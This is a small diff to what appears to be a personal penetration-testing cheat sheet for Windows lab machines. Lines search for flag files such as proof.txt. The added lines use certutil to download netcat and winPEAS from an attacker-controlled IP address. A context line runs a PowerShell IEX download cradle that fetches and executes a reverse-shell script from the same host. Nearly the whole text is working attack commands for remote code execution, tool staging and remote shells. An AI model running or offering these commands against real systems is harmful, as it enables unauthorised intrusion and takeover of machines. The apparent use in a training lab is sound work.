@@ -3,6 +3,10 @@ dir directory\*.txt /s /p
 dir C:\proof.txt /s /p
 dir C:\network-secret.txt /s /p
 
+certutil -urlcache -split -f http://192.168.119.149/nc.exe nc.exe
+
+certutil -urlcache -split -f http://192.168.119.149/winPEAS/winPEASx64.exe win.exe
+
 #Run file remotely
 powershell -C IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/Invoke-PowerShellTcp.ps1')
 
